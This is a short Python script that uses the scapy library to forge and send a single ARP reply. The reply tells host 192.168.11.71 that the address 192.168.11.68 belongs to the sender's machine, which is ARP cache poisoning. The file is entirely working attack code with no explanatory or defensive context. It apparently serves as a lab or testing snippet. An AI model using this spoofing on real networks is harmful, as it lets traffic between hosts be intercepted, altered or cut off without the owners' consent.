#!/bin/python3

from scapy.all import send, ARP

arp_reply = ARP(op=2, pdst="192.168.11.71", hwdst="66:3f:bd:fe:2b:7c", psrc="192.168.11.68")
send(arp_reply)
